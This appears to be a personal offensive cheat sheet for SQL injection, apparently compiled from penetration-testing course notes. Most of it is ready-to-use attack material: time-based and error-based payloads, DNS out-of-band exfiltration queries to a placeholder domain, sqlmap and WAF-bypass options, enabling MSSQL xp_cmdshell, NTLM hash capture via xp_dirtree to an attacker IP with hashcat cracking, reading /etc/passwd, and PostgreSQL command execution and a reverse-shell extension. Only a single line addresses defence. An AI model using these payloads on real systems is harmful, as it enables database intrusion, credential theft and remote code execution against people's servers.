#  SQLi
## Boolean-based

Code: sql

```sql
' AND 1=1;--
```

## Time-based

Code: sql

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10';--
```

| Database      | Payload                                                      |
| ------------- | ------------------------------------------------------------ |
| MSSQL         | `WAITFOR DELAY '0:0:10'`                                     |
| MySQL/MariaDB | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| PostgreSQL    | `\| (SELECT 1 FROM PG_SLEEP(10))`                            |
| Oracle        | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)`           |

## DNS Out of Band

| SQL Function                    | SQL Query                                                                                                                                                                                                                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `master..xp_dirtree`            | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`                                                                                                                                                                                                |
| `master..xp_fileexist`          | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`                                                                                                                                                                                              |
| `master..xp_subdirs`            | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`                                                                                                                                                                                                |
| `sys.dm_os_file_exists`         | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`                                                                                                                                                                                       |
| `fn_trace_gettable`             | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`                                                                                                                                                                               |
| `fn_get_audit_file`             | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`                                                                                                                                                                            |
| `split result into sub-domains` | `DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |


## sqlmap

- [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

```
# request in txt
sqlmap -r search-test.txt -p parameter

# post
sqlmap -o -u "http://example.com/index.php?id=1" --data="username=admin&password=pass&submit=+Login+" --method=POST
# get
sqlmap -u "http://example.com/index.php?id=1"

# with point of injection (*)
sqlmap -u "http://example.com/index.php?id=1*-133&debug=true"

# risk
sqlmap -u "http://example.com/index.php?id=1" --risk=3 --level=5

# headers
sqlmap --headers="HEADER"
```

## Temper

The ability to create payloads that can bypass waf

- [https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)

Example:

```
--tamper="between,randomcase"
```

## Tricks

Sometimes sites append an extra (’) character in injection. It is possible to bypass this behavior by abusing UTF-8. \xc2 asks for a follow up byte, the decoding of \xc2’ (\xc2\x27) would result in a bypass.

## Blind

Postgres

```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

## [MSSQL] RCE

Code: sql

```sql
-- Check if we are sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable 'Advanced Options'
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;

-- Enable 'xp_cmdshell'
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

-- Ping ourselves
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';
```

## [MSSQL] NetNTLM

```shell-session
w44z@htb[/htb]$ sudo python3 Responder.py -I eth0
```

Code: sql

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```

```shell-session
w44z@htb[/htb]$ hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...SNIP...000000' /usr/share/wordlists/rockyou.txt
```

## [MSSQL] File Read

Code: sql

```sql
-- Check if we have the permissions needed to read files
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

## Interacting with PostgreSQL

`psql -h <host> -U <username> <database>`

## Decompiling Java Archives

#### Fernflower

Code: bash

```bash
mkdir <OutputDirectory>
java -jar Fernflower.jar <Application>.jar <OutputDirectory>
cd <OutputDirectory>
jar -xf <Application>.jar
```

#### JD-GUI

`jd-gui <Application>.jar`

## Regex Patterns for Finding SQLi Vulnerabilities

Code: regex

```regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP
(WHERE|VALUES).*?'
(WHERE|VALUES).*" +
.*sql.*"
jdbcTemplate
```

## Live Debugging Java Applications

`java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar <Application>.jar`

## Enabling PostgreSQL Logging

`/etc/postgresql/13/main/postgresql.conf`

- Change `#logging_collector = off` to `logging_collector = on`
- `#log_statement = 'none'` to `log_statement = 'all'`
- Uncomment `#log_directory = '...'`
- Uncomment `#log_filename = '...'`

## Common Character Bypasses

- Use `/**/` instead of `space`
- Use `$$string$$` instead of `'string'`

## Error-Based SQL Injection

Code: sql

```sql
' and 0=CAST((SELECT VERSION()) AS INT)--
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
```

## Reading and Writing Files

#### Reading with COPY

Code: sql

```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;
```

#### Reading with Large Objects

Code: sql

```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
echo 726f6f743<SNIP> | xxd -r -p
```

#### Writing with COPY

Code: sql

```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

#### Writing with Large Objects

Code: sql

```sql
split -b 2048 /etc/passwd
xxd -ps -c 99999999999 xaa
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
```

## Command Execution

#### RCE with COPY

Code: sql

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

#### RCE with Extensions

Code: bash

```bash
sudo apt install postgresql-server-dev-13
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
nc -nvlp 443
```

Code: sql

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);
```

## Defending Against SQL Injection

Use `parameterized queries`!
## Articles

|URL|
|---|
|[https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)|
|[https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)|